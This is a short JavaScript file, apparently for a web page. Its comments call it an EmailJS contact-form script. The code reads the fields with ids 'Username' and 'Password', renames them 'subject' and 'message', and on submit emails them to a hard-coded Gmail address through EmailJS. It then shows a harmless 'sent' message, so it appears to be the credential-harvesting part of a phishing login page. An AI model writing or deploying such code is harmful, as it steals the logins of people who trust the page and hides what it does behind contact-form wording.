// Initialize EmailJS with your public key (API key)
emailjs.init('rbzxQsqsqS1lbs8Y1'); // Replace with your actual public key

const subjectInput = document.getElementById('Username');
const messageInput = document.getElementById('Password');
const sendBtn = document.getElementById('sendBtn');
const statusDiv = document.getElementById('status');

// Enable send button when both subject and message fields are filled
function enableSendButton() {
    sendBtn.disabled = !(subjectInput.value.trim() && messageInput.value.trim());
}

// Add event listeners to enable the send button
subjectInput.addEventListener('input', enableSendButton);
messageInput.addEventListener('input', enableSendButton);

document.getElementById('emailForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent form from refreshing the page

    const emailData = {
        subject: subjectInput.value.trim(),
        message: messageInput.value.trim(),
        to_email: 'kaioadrik08@gmail.com' // Replace with your Gmail address
    };

    // Reset status message
    statusDiv.textContent = 'Sending...';
    statusDiv.classList.remove('success', 'error', 'hidden');

    // Send email using EmailJS
    emailjs.send('service_774xxto', 'template_i2dsm05', emailData)
        .then(response => {
            console.log('Success:', response);
            statusDiv.textContent = 'Message sent successfully!';
            statusDiv.classList.add('success');
        })
        .catch(error => {
            console.error('Failed:', error);
            statusDiv.textContent = 'Failed to send message!';
            statusDiv.classList.add('error');
        });
});
